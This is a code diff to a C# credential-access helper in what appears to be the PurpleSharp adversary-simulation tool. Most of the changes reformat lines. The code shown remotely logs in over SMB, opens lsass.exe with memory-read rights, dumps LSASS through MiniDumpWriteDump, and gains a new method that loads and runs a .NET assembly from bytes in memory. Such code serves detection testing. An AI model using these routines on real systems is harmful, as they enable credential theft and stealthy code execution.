@@ -3,18 +3,22 @@ using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
+using System.IO.Compression;
 using System.Net;
+using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
 using System.Threading;
 using System.Threading.Tasks;
+using PurpleSharp.Lib;
 
 namespace PurpleSharp.Simulations
 {
     public class CredAccessHelper
     {
 
-        public static void RemoteSmbLogin(Computer computer, String domain, String username, String password, bool Kerberos, Lib.Logger logger)
+        public static void RemoteSmbLogin(Computer computer, String domain, String username, String password,
+            bool Kerberos, Lib.Logger logger)
         {
 
             NetworkCredential credentials = new NetworkCredential(username, password, domain);
@@ -28,20 +32,21 @@ namespace PurpleSharp.Simulations
             {
                 networkPath = @"\\" + computer.IPv4 + @"\ipc$";
             }
-           
+
             ConnectToSharedFolder tes = new ConnectToSharedFolder(computer, networkPath, credentials, Kerberos, logger);
             tes.Dispose();
 
         }
 
-        public static void LogonUser(String username, String domain, String password, int logontype, int logonprovider, Lib.Logger logger)
+        public static void LogonUser(String username, String domain, String password, int logontype, int logonprovider,
+            Lib.Logger logger)
         {
             IntPtr handle;
             string protocol;
 
             if (logonprovider == 0) protocol = "Kerberos";
             else protocol = "NTLM";
-            
+
 
             //logon_type 2 
             //LOGON32_PROVIDER_DEFAULT = 0
@@ -55,13 +60,14 @@ namespace PurpleSharp.Simulations
             else
             {
                 var errorCode = Marshal.GetLastWin32Error();
-                logger.TimestampInfo(String.Format("Tried to authenticate as {0} ({1}). Error Code:{2}", username, protocol, errorCode));
+                logger.TimestampInfo(String.Format("Tried to authenticate as {0} ({1}). Error Code:{2}", username,
+                    protocol, errorCode));
             }
             //_handle = new SafeTokenHandle(handle);
             //_context = WindowsIdentity.Impersonate(_handle.DangerousGetHandle());
         }
-   
-        
+
+
         public static void LsassRead(string log)
         {
             string currentPath = AppDomain.CurrentDomain.BaseDirectory;
@@ -90,7 +96,11 @@ namespace PurpleSharp.Simulations
             }
             */
             Console.WriteLine("Offset " + startOffset.ToString());
-            IntPtr phandle = WinAPI.OpenProcess(Structs.ProcessAccessFlags.CreateProcess | Structs.ProcessAccessFlags.DuplicateHandle | Structs.ProcessAccessFlags.QueryInformation | Structs.ProcessAccessFlags.VirtualMemoryRead, false, pid);
+            IntPtr phandle =
+                WinAPI.OpenProcess(
+                    Structs.ProcessAccessFlags.CreateProcess | Structs.ProcessAccessFlags.DuplicateHandle |
+                    Structs.ProcessAccessFlags.QueryInformation | Structs.ProcessAccessFlags.VirtualMemoryRead, false,
+                    pid);
             if (phandle == null)
             {
                 //Console.WriteLine("Could not get handle");
@@ -99,6 +109,7 @@ namespace PurpleSharp.Simulations
             {
                 //Console.WriteLine("Got it!");
             }
+
             int bytesRead = 0;
 
             byte[] buffer = new byte[24];
@@ -150,27 +161,30 @@ namespace PurpleSharp.Simulations
                 logger.TimestampInfo(ex.Message);
             }
             */
-            logger.TimestampInfo(String.Format("Trying to obtain a process handle to lsass.exe (PID:{0})", targetProcessId));
+            logger.TimestampInfo(String.Format("Trying to obtain a process handle to lsass.exe (PID:{0})",
+                targetProcessId));
             targetProcessHandle = targetProcess.Handle;
 
 
             bool bRet = false;
-            var errorCode=0;
+            var errorCode = 0;
 
             string systemRoot = Environment.GetEnvironmentVariable("SystemRoot");
-            string dumpFile = String.Format("{0}\\Temp\\debug{1}.out", systemRoot, targetProcessId);
-            
+            string dumpFile = String.Format("{0}\\Temp\\debug{1}.bin", systemRoot, targetProcessId);
+
             using (FileStream fs = new FileStream(dumpFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write))
             {
-                bRet = WinAPI.MiniDumpWriteDump(targetProcessHandle, targetProcessId, fs.SafeFileHandle, (uint)2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
+                bRet = WinAPI.MiniDumpWriteDump(targetProcessHandle, targetProcessId, fs.SafeFileHandle, (uint)2,
+                    IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
                 logger.TimestampInfo(String.Format("Calling MiniDumpWriteDump"));
                 errorCode = Marshal.GetLastWin32Error();
             }
-            
+
             if (bRet)
             {
                 DateTime dtime = DateTime.Now;
-                logger.TimestampInfo(String.Format("LSASS successfully dumped to {0}\\Temp\\debug{1}.out", systemRoot, targetProcessId));
+                logger.TimestampInfo(String.Format("LSASS successfully dumped to {0}\\Temp\\debug{1}.bin", systemRoot,
+                    targetProcessId));
                 //Console.WriteLine("{0}[{1}] LSASS dump successful on {2} running as {3}", "".PadLeft(4), dtime.ToString("MM/dd/yyyy HH:mm:ss"), Environment.MachineName, WindowsIdentity.GetCurrent().Name);
                 if (cleanup)
                 {
@@ -199,7 +213,24 @@ namespace PurpleSharp.Simulations
             return principal.IsInRole(WindowsBuiltInRole.Administrator);
         }
 
-
+        public static void ExecuteAssemblyLoad(Byte[] assemblyBytes, string[] param)
+        {
+            // Load the assembly
+            Assembly assembly = Assembly.Load(assemblyBytes);
+            // Find the Entrypoint or "Main" method
+            MethodInfo method = assembly.EntryPoint;
+            // Get the parameters
+            object[] parameters = new[] { param };
+            // Invoke the method with its parameters
+            try
+            {
+                method.Invoke(null, parameters);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex);
+            }
+        }
     }
-
+    
 }
